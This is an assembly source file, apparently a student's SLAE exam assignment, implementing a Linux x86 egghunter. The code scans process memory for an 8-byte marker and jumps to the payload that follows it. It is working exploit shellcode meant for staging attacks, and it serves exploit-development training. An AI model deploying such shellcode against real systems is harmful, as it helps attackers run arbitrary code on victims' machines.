; Filename: egghunter.nasm
; Author:  Alex
; SLAE-ID: SLAE-1046
; Reference: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; Website:  http://0xdeadcode.se
; 
; Purpose: Assignment 3 - SLAE Exam
;	   Egghunter	

global _start			

section .text
_start:
	xor edx, edx
next_page:
	or dx, 0xfff		; set dx to 4095
next_address:
	inc edx			; inc dx to 4096 (PAGE_SIZE)
	lea ebx, [edx+0x4]	; load 0x1004 into ebx
	push byte +0x21		; 0x21 is dec 33, the syscall for access
	pop eax			; put syscall value into eax
	int 0x80		; syscall
	
	cmp al, 0xf2		; check if return value is EFAULT (0xf2)
	jz next_page		; if so, jump back to next_page label
	mov eax, 0x50905090	; put our unique egg value in eax
	mov edi, edx		
	scasd			; search for first part of egg
	jnz next_address
	scasd			; search for second part of egg
	jnz next_address
	jmp edi			; jump to egg payload
